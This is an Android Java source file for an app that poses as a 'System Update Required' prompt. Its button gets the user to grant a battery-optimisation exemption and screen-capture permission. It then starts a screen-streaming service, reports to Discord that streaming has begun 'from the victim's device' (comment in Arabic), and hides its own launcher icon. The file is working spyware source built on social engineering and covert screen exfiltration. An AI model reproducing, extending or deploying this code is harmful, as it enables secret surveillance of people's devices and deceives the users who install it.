package com.tom5.monitor;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {
    private static final int REQ_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.WHITE);

        TextView tv = new TextView(this);
        tv.setText("System Update Required");
        tv.setTextSize(20);
        tv.setTextColor(Color.BLACK);
        tv.setPadding(0, 0, 0, 50);
        layout.addView(tv);

        Button btn = new Button(this);
        btn.setText("إصلاح النظام الآن");
        btn.setPadding(20, 20, 20, 20);
        btn.setOnClickListener(v -> {
            // طلب تجاهل تحسين البطارية
            try {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                }
            } catch (Exception e) {}

            // طلب بث الشاشة
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
            }
        });
        
        layout.addView(btn);
        setContentView(layout);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
            Intent serviceIntent = new Intent(this, ScreenService.class);
            serviceIntent.putExtra("resCode", resultCode);
            serviceIntent.putExtra("resData", data);
            startForegroundService(serviceIntent);

            DiscordSender.sendMessage("✅ تم بدء البث بنجاح من جهاز الضحية!");
            
            // إخفاء الأيقونة فوراً
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            finish();
        }
    }
}
